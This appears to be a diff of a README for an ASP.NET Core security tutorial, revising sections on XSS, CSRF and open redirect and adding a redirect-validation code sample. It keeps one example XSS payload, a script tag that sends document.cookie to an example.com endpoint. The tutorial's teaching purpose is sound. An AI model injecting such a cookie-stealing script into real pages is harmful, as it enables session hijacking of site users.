@@ -124,7 +124,7 @@ Also we can define more specific rules. I tried explain in project file. You can
 
 # Attacks
 ## XSS
-This is a kind of script vulnerability. Done by integrate harmful script in our HTML and JS files. There are 3 ways. But we can apply same solution all of them. Net Core provide solution as default. Again thanks great dot net. Not need to define in `Startup.cs` file. if we want we can disable it.
+This is a kind of script vulnerability. Done by integrate harmful script in our HTML and JS files. Actually There are 3 ways. But we can apply same solution all of them. Net Core provide solution as default. Again thanks great dot net. Not need to define in `Startup.cs` file. if we want we can disable it.
 ```html
 <script> new Image().\"http://example.com/readCookie/?account=\"+document.cookie\"</script>
 ```
@@ -141,8 +141,8 @@ This way genrally weld up from trying to payload after # sign.
     <img src="https://github.com/ikbalkazanc/Asp.NetCore-Security/blob/master/cross_site_request_forger_1.png.jpg" alt="Logo" width="80%" height="80%" ">
 </a></div>
 </br>
-Actually picture explain everything. in sum, hacker is creating new request with using fake url. in meantime he's stealing datas inside of request.</br>
-Solution of this problem is simple too with Asp.Net Core. We're will using application level filter. We're adding service in `Startup.cs` file. And it finished.
+Actually picture explain everything. in sum, hacker is creating new request with using fake url. in meantime he's stealing datas inside of request. Solution of this problem is simple too with Asp.Net Core. it's creating token for request. When reponse arrive in back Asp.Net Core is checking token.</br>
+We're will using as application level filter. We're adding service in `Startup.cs` file. And it finished.
 
 ````csharp
 services.AddControllersWithViews(opt =>
@@ -161,9 +161,37 @@ public IActionResult Index()
 }
 ````
 <strong>Note :</strong> if necessary you can find about CSRF code in `Course.Attacks.XSS.Web` project.
-
 ## Open Redirect Attack
-
+Let's think like this, as example. You are liked .357 cal revolver in amazon. But must sign in to amazon for buy it. And it's direct to sign page you. And generally be url like that.
+```url
+https://www.amazon.com.tr/ap/signin?returnUrl=url_of_the_weapon_of_your_dreams
+```
+Hacker by converting url trying stole your data. Converted url be like that.
+```url
+https://www.amazon.com.tr/ap/signin?returnUrl=bad_hacker_url
+```
+Solution is very simple. We can overcome problem with little check process. e.g. 
+```csharp
+public IActionResult Login(string returnUrl = "/")
+{
+    TempData["returnUrl"] = returnUrl;
+    return View();
+}
+[HttpPost]
+public IActionResult Login(string mail,string password)
+{
+    string returnUrl = TempData["returnUrl"].ToString();
+    //Acount Authorization
+    if (Url.IsLocalUrl(returnUrl))
+    {
+      return Redirect(returnUrl);
+    }
+    else
+    {
+      return Redirect("/");
+    }          
+}
+```
 ## SQL Injection
 <!-- CONTACT -->
 ## Contact
